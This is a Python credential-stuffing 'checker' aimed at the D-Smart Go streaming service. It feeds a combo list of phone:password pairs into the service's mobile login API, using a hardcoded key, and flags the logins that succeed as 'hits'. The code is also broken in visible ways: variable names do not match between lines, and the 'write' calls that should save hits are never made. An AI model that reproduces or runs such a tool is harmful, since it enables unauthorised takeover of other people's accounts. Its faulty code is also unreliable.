import requests
import time
from termcolor import colored
from cfonts import render
import webbrowser

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} @Roox_00    |
|{Z}[+] Chanel  : {B}JED ~ ARCHIVE |
|{Z}[+] Tool  : {B} D-Smart Checker |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')

Uluscombo = input("\x1b[1;36m ~ Dosya Adı Girin. : ")

headers = {
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

params = {
    'key': 'ac3f095f717f2665f3e8787d8f62ebc1',
}


hit_hesaplar = open('D-Smart Go Hits.txt', 'a', encoding='utf-8')

try:
    with open(Ulusumcombo, 'r') as file:
        for line in file:
            try:
                Ulusno, Uluspass = line.strip().split(':')
                json_data = {
                    'mobile': Ulusno,
                    'password': Uluspass,
                    'rememberMe': False,
                }
                kieza = requests.post('https://api-crm4.ercdn.com/membership/login/mobile', params=params, headers=headers, json=json_data)
                data = Ulus.json()
                
                if data.get('Success') == False:
                    print(colored(f'Giriş Başarısız. ❌ {Ulusno} | {Uluspass}', 'red'))
                    print("\x1b[1;39m—" * 60)
                elif data.get('ErrorMessage') == 'Wrong mobile or password':
                    print(colored(f'Giriş Başarısız. ❌ {Ulusno} | {Uluspass}', 'red'))
                    print("\x1b[1;39m—" * 60)
                else:
                    print(colored(f'Giriş Başarılı. ✅ {Ulusno} | {Uluspass}', 'green'))
                    print("\x1b[1;39m—" * 60)
                    hit_hesaplar.write
                    hit_hesaplar.write
                    hit_hesaplar.write
                    hit_hesaplar.write
                    hit_hesaplar.write          
            except Exception as e:
                print(f"Hata: {e}")
                time.sleep(2)
                continue
except FileNotFoundError:
    print(colored("Malesef Dostum, O İsimde Bir Dosya Yok. 🟡", 'yellow'))
except Exception as e:
    print(f"Hata: {e}")

print(colored("🟢 Tüm Hesapları Check Edildi, Hit Hesaplar PyDroid-3 Klasörüne Kaydedildi.", 'green'))

hit_hesaplar.close()
